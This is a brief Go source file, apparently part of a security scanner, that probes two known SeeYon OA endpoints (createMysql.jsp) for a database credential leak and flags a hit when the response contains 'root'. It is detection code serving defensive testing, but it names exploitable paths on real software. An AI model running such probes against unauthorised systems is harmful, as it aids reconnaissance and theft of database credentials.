package seeyon

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

// createMysql.jsp 数据库敏感信息泄

func CreateMysql(u string, client *httpx.Client) bool {
	if req, err := client.Request(u+"/yyoa/createMysql.jsp", "GET", "", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
			return true
		}
	}
	if req, err := client.Request(u+"/yyoa/ext/createMysql.jsp", "GET", "", nil, "Poc SeeYon"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "root") {
			return true
		}
	}
	return false
}
